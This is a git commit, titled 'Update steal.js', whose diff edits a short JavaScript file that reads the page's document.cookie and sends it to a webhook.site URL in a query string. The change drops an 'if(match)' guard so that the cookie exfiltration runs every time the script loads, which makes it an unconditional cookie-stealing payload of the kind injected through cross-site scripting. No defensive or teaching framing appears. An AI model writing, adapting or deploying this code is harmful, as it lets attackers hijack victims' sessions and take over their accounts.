7bdaa9cd3a96e2c2ddb4fcb79d4ef41aa7bd4af2
Dan1e1B <147431777+Dan1e1B@users.noreply.github.com>
2025-12-06 00:44:52 +0000

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,5 +1,4 @@
 var cookies = document.cookie;
-if(match) {
+
     // Send to webhook
-    fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?secret=' + cookies);
-}
+fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?secret=' + cookies);
